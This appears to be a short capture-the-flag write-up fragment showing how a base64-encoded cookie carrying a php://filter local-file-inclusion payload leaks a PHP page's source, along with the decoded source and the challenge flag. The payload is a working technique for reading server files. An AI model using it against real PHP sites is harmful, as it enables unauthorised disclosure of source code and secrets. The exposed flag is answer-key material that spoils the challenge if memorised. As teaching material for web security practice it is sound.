```
btoa('{"path":"php://filter/","page":"convert.base64-encode/resource=./flag"}')
"eyJwYXRoIjoicGhwOi8vZmlsdGVyLyIsInBhZ2UiOiJjb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9Li9mbGFnIn0="
atob("PD9waHAKaWYoIWRlZmluZWQoJ015Q29uc3QnKSkgewogICBkaWUoJ0RpcmVjdCBhY2Nlc3Mgbm90IHBlcm1pdHRlZCcpOwp9Cj8+Cgo8aDQ+V2h5IGRvZXMgRWdpc2NoZSBrZWVwIHNob3dpbmcgdXA/PC9oND4KPD9waHAKCmlmICgkX0NPT0tJRVsiemVyb29uZW9uZSJdKSB7CiAgICAkZGF0YSA9IGpzb25fZGVjb2RlKGJhc2U2NF9kZWNvZGUoJF9DT09LSUVbInplcm9vbmVvbmUiXSksIHRydWUpOwp9CgppZiAoZmFsc2UpIHsKPz4KICAgIDxwPgogICAgICAgIFRoZSBkYXJrIHNlY3JldCBvbiB0aGlzIHBhZ2UgaXM6IE5PVkl7TEZJX2FuZF9zdDFsbF95b3VfZjB1bmRfaXR9CiAgICA8L3A+Cjw/Cn0gZWxzZSB7Cj8+CiAgICA8cD4KICAgICAgICBZb3UgYXJlIG9uIHRoZSByaWdodCBwYWdlLCBidXQgeW91IGNhbm5vdCBzZWUgd2hhdCB5b3Ugd2FudCB5ZXQuIEdvIGdldCBwcm9tb3RlZCEKICAgIDwvcD4KPD9waHAKfQo/Pgo=")
"<?php
if(!defined('MyConst')) {
   die('Direct access not permitted');
}
?>

<h4>Why does Egische keep showing up?</h4>
<?php

if ($_COOKIE["zerooneone"]) {
    $data = json_decode(base64_decode($_COOKIE["zerooneone"]), true);
}

if (false) {
?>
    <p>
        The dark secret on this page is: NOVI{LFI_and_st1ll_you_f0und_it}
    </p>
<?
} else {
?>
    <p>
        You are on the right page, but you cannot see what you want yet. Go get promoted!
    </p>
<?php
}
?>
"
```
<img src="../images/11.png">
